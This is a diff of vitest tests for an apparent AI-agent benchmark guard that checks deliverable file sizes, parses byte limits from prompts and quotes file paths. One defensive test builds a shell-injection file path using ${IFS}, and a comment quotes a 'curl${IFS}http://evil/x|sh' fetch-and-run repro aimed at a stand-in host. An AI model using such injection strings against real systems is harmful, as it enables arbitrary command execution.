@@ -1,4 +1,6 @@
 import { describe, it, expect, beforeEach, afterEach } from "vitest";
+import { execSync } from "node:child_process";
+import { existsSync, unlinkSync } from "node:fs";
 import setupExtension, {
   buildTriggerAMessage,
   buildTriggerCRecoveryMessage,
@@ -9,6 +11,7 @@ import setupExtension, {
 } from "./index.ts";
 import { resolveFinalizeMessage } from "../_shared/finalize-message.ts";
 import { INITIAL_SNAPSHOT_APP_DIR } from "../_shared/snapshot-paths.ts";
+import { TB_PROXY_PREFIX } from "../_shared/tb-proxy.ts";
 
 interface Handler {
   (event: any, ctx: any): Promise<unknown> | unknown;
@@ -18,6 +21,10 @@ function makeHarness() {
   const calls: string[] = [];
   const sent: { text: string; options: any }[] = [];
   const notifies: string[] = [];
+  // Every title `ctx.ui.input` was called with, in call order — lets a test
+  // inspect the actual `__LC_TB_SHELL__` payload (and so the actual command
+  // string) a proxy call carried, not just that a call happened.
+  const inputs: string[] = [];
   const handlers: Record<string, Handler[]> = {};
   // `tbProxyResponses` queues Trigger E's `ui.input` replies (the
   // `__LC_TB_SHELL__` proxy channel `tbProxyRun` calls) in FIFO order — one
@@ -42,13 +49,14 @@ function makeHarness() {
         notifies.push(m);
         calls.push("notify");
       },
-      async input(_title: string, _initial?: string) {
+      async input(title: string, _initial?: string) {
+        inputs.push(title);
         calls.push("proxy-input");
         return state.tbProxyResponses.length > 0 ? (state.tbProxyResponses.shift() ?? null) : null;
       },
     },
   };
-  return { pi, ctx, calls, sent, notifies, state };
+  return { pi, ctx, calls, sent, notifies, inputs, state };
 }
 
 /** A `wc -c`-shaped proxy response with a well-formed exit-0 footer. */
@@ -1348,6 +1356,34 @@ describe("tb-finalize-guard", () => {
         // is excluded.
         expect(parseByteLimit("Output should be less than 2KB.")).toBe(2048);
       });
+
+      it("does not misread a floor stated as 'must/should not BE less than' either — confirmed regression", () => {
+        // Confirmed by execution: the old lookbehind only inspected the
+        // single token immediately before "less" ("be", not "not"/"no"), so
+        // both of these parsed as a 5000-byte CEILING despite stating a
+        // floor.
+        expect(parseByteLimit("The file must not be less than 5000 bytes.")).toBeUndefined();
+        expect(parseByteLimit("The file should not be less than 5000 bytes.")).toBeUndefined();
+      });
+
+      it("does not silently pick the wrong constraint when the prompt states two distinct sizes", () => {
+        // Confirmed by execution: first-match-with-no-ambiguity-check used to
+        // return 64 here (an unrelated per-record constraint), not 5000 (the
+        // deliverable's own limit).
+        expect(
+          parseByteLimit("each record must be 64 bytes; the program must be under 5000 bytes"),
+        ).not.toBe(64);
+      });
+
+      it("does not mistake an output-size constraint for the deliverable's own limit", () => {
+        // Confirmed by execution: used to return 100 (the output-size cap),
+        // not the deliverable's own (unstated, here) byte limit.
+        expect(
+          parseByteLimit(
+            "Write a program that prints at most 100 bytes of output. Call your program /app/gpt2.c.",
+          ),
+        ).toBeUndefined();
+      });
     });
 
     describe("path parsing", () => {
@@ -1432,6 +1468,24 @@ describe("tb-finalize-guard", () => {
         // Only 2 consecutive over-budget checks since the under-budget reset
         // (turns 3-4), not 3 — must not have escalated yet.
         expect(h.sent).toHaveLength(0);
+      });
+
+      it("treats a file of exactly the stated limit as over budget, not compliant (strict <N, not <=N)", async () => {
+        const h = makeHarness();
+        setupExtension(h.pi as any);
+        process.env.LITTLE_CODER_TB_MODE = "1";
+        setDeadlineMinutesFromNow(120);
+        // REAL_PROMPT's limit is 5000 bytes — a file of EXACTLY 5000 bytes
+        // must be judged over budget (the real constraint is a strict "<5000
+        // bytes" ceiling), so 3 consecutive at-exactly-limit checks must
+        // still escalate.
+        await driveOverBudget(h, 0); // just resolves the prompt's limit/path
+        for (let i = 0; i < 3; i++) {
+          h.state.tbProxyResponses.push(wcResult(5000, "/app/gpt2.c"));
+          await turn(h, shellTurn(["gcc -O3 -o /app/gpt2.c gpt2.c"]));
+        }
+        expect(h.sent).toHaveLength(1);
+        expect(h.sent[0].text).toBe(buildTriggerEMessage(0, 5000));
       });
     });
 
@@ -1591,6 +1645,118 @@ describe("tb-finalize-guard", () => {
         await newSessionWithPrompt(h, REAL_PROMPT);
         await turn(h, shellTurn(["gcc -O3 -lm gpt2.c -o a.out"]));
         expect(h.calls.filter((c) => c === "proxy-input")).toHaveLength(0);
+      });
+    });
+
+    describe("interpreter-driven writes (previously undetected)", () => {
+      // Confirmed gap: a write via `python3 -c "open(path,'w').write(...)"`
+      // produced zero detected writes, so this check never ran for that
+      // turn even though the deliverable had just been rewritten.
+      it("checks size when the deliverable is written via a python3 -c inline script", async () => {
+        const h = makeHarness();
+        setupExtension(h.pi as any);
+        process.env.LITTLE_CODER_TB_MODE = "1";
+        h.state.tbProxyResponses.push(wcResult(3000, "/app/gpt2.c"));
+        await newSessionWithPrompt(h, REAL_PROMPT);
+        await turn(
+          h,
+          shellTurn([`python3 -c "open('/app/gpt2.c','w').write('int main(){}')"`]),
+        );
+        expect(h.calls.filter((c) => c === "proxy-input")).toHaveLength(1);
+      });
+    });
+
+    describe("path quoting — the deliverable path can carry shell metacharacters (task-prompt injection)", () => {
+      // Confirmed gap: `checkDeliverableSize` interpolated the parsed
+      // deliverable path directly into `wc -c ${path}` with no quoting, so a
+      // task prompt (untrusted, task-author-controlled text) whose path
+      // capture contained shell metacharacters could inject a second command
+      // into the container shell that runs `wc -c`.
+      const MARKER = `/tmp/tb-finalize-guard-injection-marker-${process.pid}`;
+      // `${IFS}` (default: space/tab/newline) is a classic no-literal-space
+      // way to spell a word break — the same technique the spec's own
+      // `curl${IFS}http://evil/x|sh` repro used; `touch`/local-file-only
+      // here so the live-shell run below has no network dependency.
+      const MALICIOUS_PATH = `/app/gpt2.c;touch\${IFS}${MARKER};true`;
+
+      afterEach(() => {
+        try {
+          unlinkSync(MARKER);
+        } catch {
+          // Nothing to clean up — the point of the test.
+        }
+      });
+
+      it("quotes the deliverable path before it reaches tbProxyRun, proven by actually running the captured command in a real shell", async () => {
+        expect(existsSync(MARKER)).toBe(false);
+
+        const h = makeHarness();
+        setupExtension(h.pi as any);
+        process.env.LITTLE_CODER_TB_MODE = "1";
+        h.state.tbProxyResponses.push(wcResult(3000, MALICIOUS_PATH));
+        await newSessionWithPrompt(
+          h,
+          `Your program must be under 5000 bytes. Call your program ${MALICIOUS_PATH}`,
+        );
+        await turn(h, shellTurn([`gcc -O3 -o "${MALICIOUS_PATH}" gpt2.c`]));
+        expect(h.calls.filter((c) => c === "proxy-input")).toHaveLength(1);
+
+        const payload = JSON.parse(h.inputs[0].slice(TB_PROXY_PREFIX.length));
+        const command: string = payload.command;
+        expect(command.startsWith("wc -c ")).toBe(true);
+
+        // Live-code proof: actually run the exact command tbProxyRun was
+        // handed, in a real shell — an unquoted interpolation would run the
+        // injected `touch` (and create MARKER); a quoted one can't.
+        try {
+          execSync(command, { shell: "/bin/bash", stdio: "pipe" });
+        } catch {
+          // `wc -c` on a made-up filename exits non-zero — expected, not a
+          // signal of anything.
+        }
+        expect(existsSync(MARKER)).toBe(false);
+      });
+    });
+
+    describe("agent_end / no-write-this-turn corrective check", () => {
+      // Confirmed gap: the only check at agent_end was maybeFireTriggerC;
+      // an over-budget deliverable that wasn't rewritten on the run's final
+      // turn(s) (only compiled/run, or simply never touched again) reached
+      // the run's end with zero corrective steer.
+      it("produces a corrective nudge at agent_end even when no write happened this run", async () => {
+        const h = makeHarness();
+        setupExtension(h.pi as any);
+        process.env.LITTLE_CODER_TB_MODE = "1";
+        setDeadlineMinutesFromNow(120);
+        h.state.tbProxyResponses.push(wcResult(6927, "/app/gpt2.c"));
+        await newSessionWithPrompt(h, REAL_PROMPT);
+        // No turn_start/turn_end at all this run — no write evidence, and
+        // the per-turn escalation's 3-consecutive-checks counter never even
+        // starts.
+        await settle(h);
+        expect(h.sent).toHaveLength(1);
+        expect(h.sent[0].text).toBe(buildTriggerEMessage(1927, 5000));
+      });
+
+      it("does not fire when the deliverable is at or under the limit at agent_end", async () => {
+        const h = makeHarness();
+        setupExtension(h.pi as any);
+        process.env.LITTLE_CODER_TB_MODE = "1";
+        setDeadlineMinutesFromNow(120);
+        h.state.tbProxyResponses.push(wcResult(3000, "/app/gpt2.c"));
+        await newSessionWithPrompt(h, REAL_PROMPT);
+        await settle(h);
+        expect(h.sent).toHaveLength(0);
+      });
+
+      it("does not fire when no limit/path resolved at all", async () => {
+        const h = makeHarness();
+        setupExtension(h.pi as any);
+        process.env.LITTLE_CODER_TB_MODE = "1";
+        await newSession(h);
+        await settle(h);
+        expect(h.calls.filter((c) => c === "proxy-input")).toHaveLength(0);
+        expect(h.sent).toHaveLength(0);
       });
     });
   });
